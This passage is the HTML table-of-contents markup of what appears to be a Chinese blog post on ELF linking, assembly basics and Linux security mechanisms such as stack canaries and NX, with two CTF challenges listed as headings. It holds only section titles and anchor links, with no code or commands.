href="#%E9%93%BE%E6%8E%A5%E9%98%B6%E6%AE%B5"><span class="toc-article-text">链接阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%87%E6%B3%A8"><span class="toc-article-text">备注</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-article-text">ELF 文件格式</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E8%A7%86%E8%A7%92"><span class="toc-article-text">链接视角</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%90%E8%A1%8C%E8%A7%86%E8%A7%92"><span class="toc-article-text">运行视角</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">静态链接</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">动态链接</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-article-text">0x01 汇编基础</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CISC-%E4%B8%8E-RISC"><span class="toc-article-text">CISC 与 RISC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#x86-x64-%E5%9F%BA%E7%A1%80"><span class="toc-article-text">x86&#x2F;x64 基础</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-Linux-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-article-text">0x02 Linux 安全机制</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-article-text">基础</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Stack-Canaries"><span class="toc-article-text">Stack Canaries</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NJCTF-2017-messager"><span class="toc-article-text">NJCTF 2017: messager</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sixstars-CTF-2018%EF%BC%9Ababystack"><span class="toc-article-text">sixstars CTF 2018：babystack</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NX-No-eXecute"><span class="toc-article-text">NX:No-eXecute</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-5"><a class="toc-article-link" href="#NX-%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-article-text">NX 的实现</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
 		</div>
 	
 	</div>
